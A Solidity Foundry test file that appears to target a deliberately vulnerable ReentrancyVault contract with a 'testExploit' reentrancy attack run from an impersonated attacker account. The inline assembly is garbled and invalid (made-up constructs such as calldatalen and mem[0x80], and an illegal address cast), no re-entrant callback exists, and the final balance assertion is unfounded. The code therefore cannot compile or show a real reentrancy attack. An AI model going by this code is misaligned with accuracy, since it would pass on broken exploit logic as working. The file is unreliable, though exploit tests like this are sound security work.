// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./basetest.sol";
import "../src/ReentrancyVault.sol";

contract ReentrancyVaultTest is BaseTestWithBalanceLog {
    ReentrancyVault target;
    
    function setUp() public {
        super.setUp();
        target = ReentrancyVault(new ReentrancyVault());
    }

    // Execute a reentrancy attack
    function testExploit() public  balanceLog {
        (bool success, ) = payable(address(target)).call{value: 1 ether}("");
        require(success, "Failed to deposit");

        address attacker = createAccountWithBalance(2 ether);
        vm.startPrank(attacker);

        bool result;
        assembly {
            let x := mload(0x60)
            mstore(x, selector(receive.selector) | (uint256(address(this)) << 96))
            mstore(add(x, 4), calldatalen)
            mstore(add(x, 36), calldata)
            result := call(gas(), target, 1 ether, add(x, 4), calldatalen, mem[0x80], 32)
        }

        assertEq(target.balances(address(attacker)), 1.99 ether);
    }
}